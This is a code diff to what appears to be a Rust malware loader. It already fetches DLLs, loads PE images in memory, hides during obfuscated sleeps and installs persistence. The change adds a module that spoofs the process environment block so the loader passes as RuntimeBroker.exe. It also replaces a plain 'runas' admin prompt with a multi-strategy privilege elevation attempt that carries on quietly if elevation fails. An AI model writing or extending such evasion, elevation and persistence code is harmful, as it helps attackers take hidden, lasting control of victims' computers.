@@ -1,5 +1,6 @@
 mod config;
 mod dll_fetch;
+mod elevation;
 mod pe_loader;
 mod sleep_obfuscation;
 
@@ -94,13 +95,16 @@ fn main() {
         }
     };
 
-    // 8. Obfuscated sleep (random 1-5s delay, encrypts .text while sleeping)
+    // 8. PEB spoofing — mask image path as a legitimate Windows binary
+    elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
+
+    // 9. Obfuscated sleep (random 1-5s delay, encrypts .text while sleeping)
     {
         let delay_ms = 1000 + (rand::random::<u64>() % 4000);
         sleep_obfuscation::obfuscated_sleep(std::time::Duration::from_millis(delay_ms));
     }
 
-    // 9. Call entry point with config JSON
+    // 10. Call entry point with config JSON
     let config_bytes = loader_cfg.config_json.as_bytes();
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
@@ -148,7 +152,13 @@ fn parse_injected_config() -> Option<(InjectedConfig, String)> {
 
 fn apply_persistence(require_admin: bool, copy_to_path: Option<&str>, enable_persistence: bool) {
     if require_admin {
-        ensure_admin();
+        let exe = env::current_exe()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or_default();
+        if !exe.is_empty() {
+            let _ = elevation::try_elevate(&exe);
+        }
+        // If not admin after all strategies, continue anyway (degrade gracefully)
     }
 
     if let Some(path) = copy_to_path {
@@ -159,40 +169,6 @@ fn apply_persistence(require_admin: bool, copy_to_path: Option<&str>, enable_per
 
     if enable_persistence {
         install_persistence();
-    }
-}
-
-fn ensure_admin() {
-    #[cfg(target_os = "windows")]
-    {
-        if is_windows_admin() {
-            return;
-        }
-        let exe = match env::current_exe() {
-            Ok(p) => p,
-            Err(_) => std::process::exit(1),
-        };
-        let exe_wide: Vec<u16> = exe.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
-        unsafe {
-            ShellExecuteW(
-                std::ptr::null_mut(),
-                wide("runas").as_ptr(),
-                exe_wide.as_ptr(),
-                std::ptr::null(),
-                std::ptr::null(),
-                1,
-            );
-        }
-        std::process::exit(0);
-    }
-    #[cfg(not(target_os = "windows"))]
-    {
-        let uid = unsafe { libc::getuid() };
-        if uid == 0 {
-            return;
-        }
-        eprintln!("[!] Must run as root. Exiting.");
-        std::process::exit(1);
     }
 }
 
@@ -516,32 +492,3 @@ fn parse_wmi_datetime(s: &str) -> Result<u64, ()> {
     Ok(days_since_epoch * 86400 + hour as u64 * 3600 + min as u64 * 60 + sec as u64)
 }
 
-#[cfg(target_os = "windows")]
-fn is_windows_admin() -> bool {
-    use std::os::windows::process::CommandExt;
-    std::process::Command::new("net")
-        .args(["session"])
-        .creation_flags(0x08000000)
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .status()
-        .map(|s| s.success())
-        .unwrap_or(false)
-}
-
-#[cfg(target_os = "windows")]
-unsafe fn wide(s: &str) -> Vec<u16> {
-    s.encode_utf16().chain(std::iter::once(0)).collect()
-}
-
-#[cfg(target_os = "windows")]
-extern "system" {
-    fn ShellExecuteW(
-        hwnd: *mut std::ffi::c_void,
-        lpOperation: *const u16,
-        lpFile: *const u16,
-        lpParameters: *const u16,
-        lpDirectory: *const u16,
-        nShowCmd: i32,
-    ) -> usize;
-}
